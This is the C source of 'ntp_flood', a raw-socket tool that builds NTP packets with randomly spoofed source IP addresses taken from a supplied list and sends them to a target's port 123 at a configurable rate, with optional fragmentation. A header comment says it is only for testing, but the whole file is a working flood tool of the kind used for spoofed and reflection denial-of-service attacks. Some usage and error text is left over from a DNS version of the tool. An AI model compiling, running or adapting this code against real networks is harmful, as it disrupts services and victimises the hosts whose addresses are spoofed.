/*
warning: this program just uses for ntp test.
compile: gcc -O ntp_flood.c -o ntp_flood
author: Carl Guan
date: 2013/9/6
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <time.h>
#include <signal.h>
#include <linux/if_ether.h>

#define RAND_REPEAT 0

#define MAX_IPS_COUNT 256

#ifdef GBIT
#define GBIT_DEF "-gbit"
#else
#define GBIT_DEF
#endif

#define VERSION "1.008" GBIT_DEF

#define JAN_1970 	0x83aa7e80
#define NTPFRAC(x)      (4294 * (x) + ((1981 * (x)) >> 11))
#define USEC(x)         (((x) >> 12) - 759 * ((((x) >> 10) + 32768) >> 16))

struct ntphdr
{
	unsigned int flag;
	unsigned int root_delay;
	unsigned int root_dispersion;
	unsigned int reference_identifier; 
};

struct psdhdr
{
	unsigned int sip;
	unsigned int dip;
	unsigned char mbz;
	unsigned char protocol;
	unsigned short len;
};

struct IPS_RECORD
{
	unsigned int ip;
	unsigned int ipmask;
};

struct CONFIG_DATA
{
	unsigned int dip;
	unsigned char dip_mask;
	unsigned char ttl_begin;
	unsigned char ttl_end;
	unsigned short sport_begin;
	unsigned short sport_end;
	unsigned char is_linux;
	unsigned char ip_frag;
	int send_count;
	unsigned int send_pps;
	int repeat_num;
	char ips_filename[512];
};

int debug = 0;
int didsig = 0;
struct CONFIG_DATA config_data = {0};
struct IPS_RECORD * ips_records = NULL;
int ips_records_size = 0;
int ips_records_num = 0;

void trim(char * str)
{
	int i;
	int len = strlen(str);
	for(i = 0; i < len; i++) {
		if(str[i] != ' ' && str[i] != '\t')
			break;
	}
	if(i > 0)
		memmove(str, str + i, len - i);
	for(i = len - i; i > 0; i--) {
		if(str[i] != ' ' && str[i] != '\t')
			break;
	}
	str[i + 1] = 0;
}

void show_config_info()
{
	int i, j;
	printf("ntpserver : %x/%d\n", config_data.dip, config_data.dip_mask);	
	printf("ips_file : %s\n", config_data.ips_filename);
	printf("is_linux : %d\n", config_data.is_linux);
	printf("sport_begin : %d; sport_end : %d\n", config_data.sport_begin, config_data.sport_end);
	printf("ttl_begin : %d; ttl_end : %d\n", config_data.ttl_begin, config_data.ttl_end);
	printf("ip_frag : %d\n", config_data.ip_frag);
	printf("send_count : %d\n", config_data.send_count);
	printf("send_pps : %d\n", config_data.send_pps);
	printf("repeat_num : %d\n", config_data.repeat_num);
}

int parse_ips(char * data, unsigned int * ip, unsigned int * ipmask)
{
	char * sip = NULL, * sipmask = NULL;
	int i;
	sip = data;
	for(i = strlen(data) - 1; i >= 1; i--) {
		if(data[i] == '/') {
			data[i] = 0;
			sipmask = data + i + 1;
			break;
		}
	}
	if(!sip)
		return 0;
	*ip = inet_addr(sip);
	if(*ip == 0xffffffff)
		return 0;
	if(sipmask) {
		*ipmask = atoi(sipmask);
		if(*ipmask > 32)
			return 0;
	}
	return 1;
}

int parse_config(int argc, char *argv[])
{
	int arg_idx = 0;
	int need_arg_num = 10;
	if(argc < need_arg_num) {

		printf("version %s\n", VERSION);
		printf("Usage : %s dns_server_ip ips_list_filename is_linux ttl_begin/ttl_end sport_begin/sport_end ip_frag send_count send_pps repeat_num [debug]\n", argv[0]);
		printf("example : %s 192.168.0.24/32 ip.txt 1 120/126 1025/65535 0 -1 -1 0\n", argv[0]);
		return -1;
	}
	//dns_server_ip
	arg_idx ++;
	{
		char * dip = NULL, * dip_mask = NULL;
		int i;
		dip = argv[arg_idx];
		for(i = strlen(argv[arg_idx]) - 1; i >= 1; i--) {
			if(argv[arg_idx][i] == '/') {
				argv[arg_idx][i] = 0;
				dip_mask = argv[arg_idx] + i + 1;
				break;
			}
		}
		config_data.dip = inet_addr(dip);
		if(config_data.dip == 0xffffffff) {
			printf("ntp_flood : error dip format!\n");
			return -1;
		}
		if(dip_mask) {
			config_data.dip_mask = atoi(dip_mask);
			if(config_data.dip_mask > 32) {
				printf("ntp_flood : dip_mask must be between 0 and 32!\n");
				return -1;
			}
		} else {
			config_data.dip_mask = 32;
		}
	}
	
	//ips_list_filename
	arg_idx ++;
	{
		FILE * fp;
		char line[256] = {0};
		int i;
		strncpy(config_data.ips_filename, argv[arg_idx], strlen(argv[arg_idx]));
		fp = fopen(config_data.ips_filename, "r");
		if(!fp) {
			printf("ntp_flood : cannot open ipslistfile %s\n", argv[arg_idx]);
			return -1;
		}
		while(!feof(fp) && fgets(line, sizeof(line) - 1, fp) != NULL && ips_records_num < ips_records_size) {
			if(strlen(line) > 0 && line[strlen(line) - 1] == '\n') {
				line[strlen(line) - 1] = 0;
				if(strlen(line) > 0 && line[strlen(line) - 1] == '\r')
					line[strlen(line) - 1] = 0;
			}
			trim(line);
			if(!parse_ips(line, &ips_records[ips_records_num].ip, &ips_records[ips_records_num].ipmask)) 
				continue;
			ips_records_num ++;
		}
		fclose(fp);
		if(ips_records_num == 0) {
			printf("ntp_flood : ip record num is 0!\n");
			return -1;
		}
	}
	
	//is_linux
	arg_idx ++;
	{
		config_data.is_linux = atoi(argv[arg_idx]) ? 1 : 0;
	}
		arg_idx ++;
	{
		char * ttl_begin = NULL, * ttl_end = NULL;
		int i;
		ttl_begin = argv[arg_idx];
		for(i = strlen(argv[arg_idx]) - 1; i >= 1; i--) {
			if(argv[arg_idx][i] == '/') {
				argv[arg_idx][i] = 0;
				ttl_end = argv[arg_idx] + i + 1;
				break;
			}
		}
		if(!ttl_begin || !ttl_end) {
			printf("ntp_flood : ttl_begin or ttl_end do not set!\n");
			return -1;
		}
		config_data.ttl_begin = atoi(ttl_begin);
		config_data.ttl_end = atoi(ttl_end);
		if(config_data.ttl_begin > config_data.ttl_end) {
			printf("ntp_flood : ttl_end must be larger than ttl_begin!\n");
			return -1;
		}
	}
	
	//sport_begin/sport_end
	arg_idx ++;
	{
		char * sport_begin = NULL, * sport_end = NULL;
		int i;
		sport_begin = argv[arg_idx];
		for(i = strlen(argv[arg_idx]) - 1; i >= 1; i--) {
			if(argv[arg_idx][i] == '/') {
				argv[arg_idx][i] = 0;
				sport_end = argv[arg_idx] + i + 1;
				break;
			}
		}
		if(!sport_begin || !sport_end) {
			printf("ntp_flood : sport_begin or sport_end do not set!\n");
			return -1;
		}
		config_data.sport_begin = atoi(sport_begin);
		config_data.sport_end = atoi(sport_end);
		if(config_data.sport_begin > config_data.sport_end) {
			printf("ntp_flood : sport_begin must be larger than sport_end!\n");
			return -1;
		}
	}
	
	//ip_frag
	arg_idx ++;
	{
		config_data.ip_frag = atoi(argv[arg_idx]);
		/*if(config_data.fix_dns)
			config_data.ip_frag = 0;*/
		if(config_data.ip_frag > 2)
			config_data.ip_frag = 0;
	}	
	
	//send_count
	arg_idx ++;
	{
		config_data.send_count = atoi(argv[arg_idx]);
	}
	//send_pps
	arg_idx ++;
	{
		config_data.send_pps = atoi(argv[arg_idx]);
		if(config_data.send_pps <=0)
			config_data.send_pps = 1;
	}
	
	//repeat_num
	arg_idx ++;
	{
		config_data.repeat_num = atoi(argv[arg_idx]);
		if(config_data.repeat_num < 0)
			config_data.repeat_num = 0;
	}
	
	//[debug]
	arg_idx ++;
	{
		if(argc >= need_arg_num + 1) {
			debug = atoi(argv[arg_idx]);
		}
	}
	if(debug == 1)
		show_config_info();
	return 1;
}

inline int send_packet(int sock, unsigned char * data, int data_len)
{
	int retcode;

    if (!data || data_len <= 0)
        return -1;

	if(debug == 1) {
		int i;
		for(i = 0; i < data_len; i++) {
			printf("0x%02x ", data[i]);
			if(i % 16 == 15)
				printf("\n");
		}
		printf("\n");
	}

TRY_SEND_AGAIN:
	retcode = (int)send(sock, (void *)data, data_len, 0);
	if (retcode < 0 && !didsig) {
		switch (errno) {
			case EAGAIN:
				goto TRY_SEND_AGAIN;
				break;
			case ENOBUFS:
				goto TRY_SEND_AGAIN;
				break;
			case 1://(Operation not permitted)
				goto TRY_SEND_AGAIN;
				break;
			default:
				printf("ntp_flood : %s (errno = %d)\n", strerror(errno), errno);
				//return -1;
				return 1;
        }
	}
	return 1;
}

inline unsigned short checksum_ext(unsigned short * data1, int data1_len, unsigned short * data2, int data2_len)
{
	unsigned long cksum = 0;
	if(data1_len %2 != 0)
		return 0;
		
	while(data1_len > 1) {
		cksum += *data1++;
		data1_len -= 2;
	}
	while(data2_len > 1) {
		cksum += *data2++;
		data2_len -= 2;
	}
	if(data2_len == 1)
		cksum += *(unsigned char*)data2;

	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (unsigned short)(~cksum);
}

#if RAND_REPEAT
static int s_first_rand = 1;
static unsigned short s_rand = 0;
#endif
inline unsigned short us_rand()
{
	unsigned short data = (unsigned short)random() | (random() & 0x01) << 15;
#if RAND_REPEAT
	if(s_first_rand == 1) {
		if(data == s_rand)
			printf("first_rand : %d\n", s_rand);
		s_rand = data;
		s_first_rand = 0;
	}
#endif
	return data;
}

inline int gen_packet(unsigned char * buf)
{
	struct iphdr * iph = (struct iphdr *)buf;
	struct udphdr * udph = (struct udphdr *)(iph + 1);	
	struct ntphdr * ntph = (struct ntphdr *)(udph + 1);
	
	int ntp_len = 0;
	unsigned int sip;
	int sipmask;
	int sip_idx;
	int i, k;
	
	time_t timer;
	
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->frag_off = htons(config_data.is_linux ? 0x4000 : 0x0);
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;

	iph->id = htons(config_data.is_linux ? 0x0 : us_rand());
	iph->ttl = us_rand() % (config_data.ttl_end - config_data.ttl_begin + 1) + config_data.ttl_begin;
	sip_idx = us_rand() % ips_records_num;
	sip = ips_records[sip_idx].ip;
	sipmask = ips_records[sip_idx].ipmask;
	iph->saddr = htonl(ntohl(sip) & (0xFFFFFFFF >> (32 - sipmask) << (32 - sipmask)) | (us_rand() % (1 << (32 - sipmask))));
	iph->daddr = htonl(ntohl(config_data.dip) & (0xFFFFFFFF >> (32 - config_data.dip_mask) << (32 - config_data.dip_mask)) | (us_rand() % (1 << (32 - config_data.dip_mask))));
	

	udph->dest = htons(123);
	udph->source = htons(us_rand() % (config_data.sport_end - config_data.sport_begin + 1) + config_data.sport_begin);

	udph->check = 0;
	
	ntph->flag = htonl((0 << 30)|(3 << 27)|(3 << 24)|(0 << 16)|(5 << 8)|(-6 & 0xff));
	ntph->root_delay = htonl(1 << 16);
	ntph->root_dispersion = htonl(1 << 16);
	ntph->reference_identifier = htonl(0x0);	
	
	time(&timer);
	
	*(unsigned int *)(ntph + 24) = htonl(JAN_1970 + (int)timer);
	*(unsigned int *)(ntph + 4) = htonl((int)NTPFRAC(timer));
	
	ntp_len += sizeof(struct ntphdr) + 32;
	
	iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + ntp_len);
	udph->len = htons(sizeof(struct udphdr) + ntp_len);
	{
		struct psdhdr psdh;
		psdh.sip = iph->saddr;
		psdh.dip = iph->daddr;
		psdh.mbz = 0;
		psdh.protocol = IPPROTO_UDP;
		psdh.len = udph->len;	
		udph->check = checksum_ext((unsigned short *)&psdh, sizeof(psdh), (unsigned short*)udph, sizeof(struct udphdr) + ntp_len);
	}
	return sizeof(struct iphdr) + sizeof(struct udphdr) + ntp_len;
}

void catcher(int signo)
{
	if (signo == SIGINT)
		didsig = 1;
}

int main(int argc, char *argv[])
{
	int sock;
	unsigned char buf[1600];	
	int len;
	int val;
	struct sockaddr_in daddr;
	unsigned long long count, sum_len, pps_count;
	unsigned long long begin_time, now_time, tmp_time;
	int i;
	struct timeval tv;
    

	ips_records_size = MAX_IPS_COUNT;
	ips_records = (struct IPS_RECORD *)malloc(sizeof(struct IPS_RECORD) * ips_records_size);
	if(!ips_records) {
		printf("ntp_flood : cannot malloc ips_records\n");
		exit(1);
	}	
	if(parse_config(argc, argv) < 0)
		exit(1);
	sock = socket(AF_INET, SOCK_RAW, htons(ETH_P_IP));
	if (sock < 0) {
		printf("ntp_flood : cannot creat raw socket\n");
		exit(1);
	}
	val = 1;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &val, sizeof(val));

	daddr.sin_family = AF_INET;
	daddr.sin_addr.s_addr = config_data.dip;
	if(connect(sock, (struct sockaddr *)&daddr, sizeof(struct sockaddr)) < 0) {
		printf("ntp_flood : cannot connect to dnsserver!\n");
		exit(1);	
	}

	signal(SIGINT, catcher);
	
	srandom(time(NULL));
	count = sum_len = 0;
	pps_count = 0;
	gettimeofday(&tv, NULL);
	begin_time = ((unsigned long long)tv.tv_sec)  * 1000 + (tv.tv_usec / 1000);
	now_time = begin_time;
	while(!didsig) {
#if RAND_REPEAT
		s_first_rand = 1;
#endif
		len = gen_packet(buf);
		if(len < 0) {
			printf("gen packet error!\n");
			break;
		}
		{	
			int frag = config_data.ip_frag;
			if(frag > 0 && frag <= 2) {
				int data_len = len - 20;
				int frag_len = data_len / 2 / 8 * 8;
				struct iphdr * iph = (struct iphdr*)buf;
				
				iph = (struct iphdr*)buf;
				data_len = len - 20;
#if 0
				if(frag == 1)
					frag_len = data_len;
				else 
#endif
					frag_len = data_len / 2 / 8 * 8;
				
				iph->frag_off = htons(0x2 << 12);
				iph->tot_len = htons(frag_len + 20);
				iph->check = 0;
				send_packet(sock, buf, frag_len + 20);
				pps_count ++;
				if(frag == 2) {
					memmove(buf + 20, buf + 20 + frag_len, data_len - frag_len);
					iph->frag_off = htons(frag_len / 8);
					iph->tot_len = htons(data_len -frag_len + 20);
					iph->check = 0;
					send_packet(sock, buf, data_len -frag_len + 20);
					pps_count ++;
				}
				count ++;
			} else {
				for(i = 0; i <= config_data.repeat_num; i++) {
					send_packet(sock, buf, len);				
					pps_count ++;
					count ++;
				}
			}
		}
		
		if(config_data.send_count > 0 && count >= config_data.send_count)
			break;
		sum_len += len;
		
		if(config_data.send_pps == 0xffffffff || config_data.send_pps == 0) { // send_pps = -1 or 0
		} else
		if(config_data.send_pps < 50)
			usleep(1000000/config_data.send_pps);
		else {
			gettimeofday(&tv, NULL);
			tmp_time = ((unsigned long long)tv.tv_sec) * 1000 + (tv.tv_usec / 1000);
			if(tmp_time - now_time >= 20) {
				now_time = tmp_time;
				pps_count = 0;
			} else {
				if(pps_count >= (config_data.send_pps / 50)) {
					gettimeofday(&tv, NULL);
					tmp_time = ((unsigned long long)tv.tv_sec) * 1000 + (tv.tv_usec / 1000);
					while(tmp_time <= now_time + 20) {						
						gettimeofday(&tv, NULL);
						tmp_time = ((unsigned long long)tv.tv_sec) * 1000 + (tv.tv_usec / 1000);
					}
					now_time = tmp_time;
					pps_count = 0;
				}
			}
		}
		if(debug == 2) {
			if(count % 10000 == 9999) {
				printf("ntp_flood : %lld time : %ld\n", count, time(NULL));
			}
		}
	}
	gettimeofday(&tv, NULL);
	tmp_time = ((unsigned long long)tv.tv_sec) * 1000 + (tv.tv_usec / 1000);
	{
		
		int use_time = (tmp_time - begin_time) / 1000;
		if(use_time <= 0)
			use_time = 1;
		printf("ntp_flood : send %lld packets %lld bytes for %d seconds with speed %lld kbps %lld pps\n", count, sum_len, use_time, sum_len * 8 / use_time / 1000, count / use_time);
	}
	close(sock);
	
	exit(0);
}
